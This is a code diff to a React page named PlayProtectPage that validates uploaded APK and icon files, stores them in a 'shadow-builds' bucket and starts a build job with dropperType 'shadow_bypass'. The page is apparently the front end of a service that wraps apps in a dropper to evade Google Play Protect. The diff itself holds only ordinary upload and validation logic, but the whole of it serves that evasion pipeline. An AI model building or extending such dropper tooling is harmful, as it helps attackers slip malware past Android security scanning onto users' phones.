@@ -103,9 +103,38 @@ function PlayProtectPage() {
   });
 
 
+  const MAX_APK_MB = 100;
+  const MAX_ICON_MB = 2;
+
+  const validateApk = async (file: File): Promise<string | null> => {
+    if (!file.name.toLowerCase().endsWith(".apk")) return "O arquivo precisa ter extensão .apk";
+    if (file.size > MAX_APK_MB * 1024 * 1024) return `APK excede ${MAX_APK_MB}MB`;
+    if (file.size < 10 * 1024) return "APK muito pequeno — provavelmente corrompido";
+    // Magic number check: APK is a ZIP archive → starts with PK\x03\x04
+    try {
+      const head = new Uint8Array(await file.slice(0, 4).arrayBuffer());
+      if (!(head[0] === 0x50 && head[1] === 0x4b && (head[2] === 0x03 || head[2] === 0x05 || head[2] === 0x07))) {
+        return "Arquivo não parece ser um APK válido (assinatura ZIP ausente)";
+      }
+    } catch {
+      /* ignore, backend will re-check */
+    }
+    return null;
+  };
+
   const handleBuild = async () => {
     if (!selectedFile || !appName) {
       toast.error("Por favor, preencha o nome do app e selecione um APK.");
+      return;
+    }
+
+    const apkError = await validateApk(selectedFile);
+    if (apkError) {
+      toast.error(apkError);
+      return;
+    }
+    if (selectedIcon && selectedIcon.size > MAX_ICON_MB * 1024 * 1024) {
+      toast.error(`Ícone excede ${MAX_ICON_MB}MB`);
       return;
     }
 
@@ -113,9 +142,9 @@ function PlayProtectPage() {
     try {
       // 1. Upload APK to storage
       const apkPath = `builds/${crypto.randomUUID()}_${selectedFile.name}`;
-      const { data: apkData, error: apkError } = await supabase.storage
+      const { error: apkError } = await supabase.storage
         .from("shadow-builds")
-        .upload(apkPath, selectedFile);
+        .upload(apkPath, selectedFile, { contentType: "application/vnd.android.package-archive", upsert: false });
 
       if (apkError) throw apkError;
 
@@ -123,9 +152,9 @@ function PlayProtectPage() {
       let iconUrl = "";
       if (selectedIcon) {
         const iconPath = `icons/${crypto.randomUUID()}_${selectedIcon.name}`;
-        const { data: iconData, error: iconError } = await supabase.storage
+        const { error: iconError } = await supabase.storage
           .from("shadow-builds")
-          .upload(iconPath, selectedIcon);
+          .upload(iconPath, selectedIcon, { contentType: selectedIcon.type || "image/png", upsert: false });
         if (!iconError) {
           iconUrl = supabase.storage.from("shadow-builds").getPublicUrl(iconPath).data.publicUrl;
         }
@@ -133,26 +162,28 @@ function PlayProtectPage() {
 
       const apkUrl = supabase.storage.from("shadow-builds").getPublicUrl(apkPath).data.publicUrl;
 
-      // 3. Create Job
+      // 3. Create Job (dropper defaults to shadow_bypass on the server)
       await createJob({
         data: {
-          appName,
+          appName: appName.trim(),
           originalApkUrl: apkUrl,
           originalIconUrl: iconUrl || undefined,
-        }
+          dropperType: "shadow_bypass",
+        },
       });
 
-      toast.success("Build iniciada com sucesso!");
+      toast.success("Build iniciada com Shadow Bypass!");
       queryClient.invalidateQueries({ queryKey: ["build-jobs"] });
       setAppName("");
       setSelectedFile(null);
       setSelectedIcon(null);
     } catch (error: any) {
-      toast.error("Erro ao iniciar build: " + error.message);
+      toast.error("Erro ao iniciar build: " + (error?.message ?? "desconhecido"));
     } finally {
       setUploading(false);
     }
   };
+
 
   return (
     <SidebarProvider>
